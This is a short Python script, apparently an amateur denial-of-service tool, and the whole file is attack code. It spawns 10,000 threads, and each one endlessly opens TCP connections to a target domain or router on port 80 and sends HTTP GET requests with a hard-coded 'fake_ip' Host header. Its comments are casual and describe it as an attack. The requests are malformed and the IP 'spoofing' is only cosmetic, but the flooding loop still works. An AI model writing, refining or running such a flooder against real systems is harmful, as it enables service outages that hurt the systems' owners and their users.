#apparently python doesn't support real multithreading so this aint the best language to use 
import threading 
import socket
#primarily because its simulating 


target = "domain name or router(Default gateway)"
#different port different service
port = 80
fake_ip = "182.32.23.44"


case = 0

# basically an endless loop of threading connections 
# tuple built in data structure
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target,port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        


        global case
        case += 1
        if case % 500 == 0:

            print(case)

        

for i in range(10000):
    thread = threading.Thread(target=attack)
    thread.start()